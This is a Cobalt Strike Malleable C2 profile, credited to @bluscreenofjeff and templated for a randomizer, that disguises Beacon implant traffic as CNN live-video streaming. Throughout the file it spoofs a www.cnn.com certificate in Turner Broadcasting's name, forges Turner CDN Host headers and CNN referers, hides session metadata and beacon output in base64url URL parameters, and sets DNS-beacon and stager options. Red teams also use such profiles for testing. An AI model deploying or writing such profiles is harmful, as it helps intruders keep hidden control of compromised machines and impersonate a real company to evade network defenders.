# This profile has been modified to use with the Malleable C2 Profile Randomizer

#
# CNN Video
# 
# Author: @bluscreenofjeff
#

#set https cert info
# CNN doesnt have real cert, guessed details
https-certificate {
    set CN       "www.cnn.com"; #Common Name
    set O        "Turner Broadcasting System Inc"; #Organization Name
    set C        "US"; #Country
    set L        "Atlanta"; #Locality
    set OU       "MSS (Media Software & Services)"; #Organizational Unit Name
    set ST       "GA"; #State or Province
    set validity "365"; #Number of days the cert is valid for
}

#default Beacon sleep duration and jitter
set sleeptime "%%number:2%%00";
set jitter    "1%%number%%";

#default useragent for HTTP comms
set useragent "%%useragent%%";

#IP address used to indicate no tasks are available to DNS Beacon
set dns_idle "8.8.4.4";

#Force a sleep prior to each individual DNS request. (in milliseconds)
set dns_sleep "0";

#Maximum length of hostname when uploading data over DNS (0-255)
set maxdns    "24%%number%%";

http-get {

    set uri "/cnn/cnnx/dai/hds/stream_hd/%%number%%/cnnxlive%%number%%_%%number%%.bootstrap";

    client {

        header "Host" "phds-live.cdn.turner.com";
        header "X-Requested-With" "ShockwaveFlash/24.0.0.186";
        header "Referer" "http://go.cnn.com/?stream=cnn&sr=watchHPbutton";

        #session metadata
        metadata {
            base64url;
            parameter "g";
        }

        parameter "hdcore" "3.4.1";
        parameter "plugin" "aasp-3.4.1.1.1";
    }


    server {


        header "Server" "ngx_openresty";
        header "Content-Type" "application/octet-stream";
        header "ETag" "%%alphanumeric:32%%";
        header "Cache-Control" "max-age=1";
        header "Connection" "keep-alive";

        #Beacon's tasks
        output {

            print;
        }
    }
}

http-post {
    
    set uri "/cnn/cnnx/dai/hds/stream_hd/%%number%%/cnnxlive%%number:2%%_%%number%%.bootstrap";
    set verb "GET";

    client {

        header "Host" "phds-live.cdn.turner.com";
        header "X-Requested-With" "ShockwaveFlash/24.0.0.186";
        

        #session ID
        id {
            base64url;
            prepend "http://go.cnn.com/?stream=cnn&sr=watchHPbutton&token=";
            header "Referer";
        }

        #Beacon's responses
        output {
            base64url;
            parameter "g";
        }

        parameter "hdcore" "3.4.1";
        parameter "plugin" "aasp-3.4.1.1.1";
    }

    server {

        header "Server" "ngx_openresty";
        header "Content-Type" "application/octet-stream";
        header "ETag" "%%alphanumeric:32%%";
        header "Cache-Control" "max-age=1";
        header "Connection" "keep-alive";

        #empty
        output {
            print;
        }
    }
}

#change the stager server
http-stager {
    server {
        header "Content-Type" "application/octet-stream";
    }
}
